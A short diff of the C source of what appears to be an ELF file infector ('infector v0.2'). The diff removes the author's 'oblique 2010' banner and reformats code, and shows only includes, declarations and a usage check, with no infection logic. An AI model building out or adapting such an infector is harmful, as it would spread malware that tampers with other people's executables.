@@ -1,5 +1,3 @@
-/* oblique 2010
- */
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -7,11 +5,13 @@
 #include <errno.h>
 #include <elf.h>
 #include <sys/stat.h>
+
 #include "infector.h"
 #include "common.h"
 
 
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[]) 
+{
     int fd, fdout, res;
     struct stat st;
     char magic[EI_NIDENT];
@@ -19,8 +19,6 @@ int main(int argc, char *argv[]) {
 
 
     if (argc != 2) {
-        printf("oblique 2010\n");
-        printf("infector v0.2\n\n");
         printf("usage: %s elf_file\n", argv[0]);
         return 1;
     }
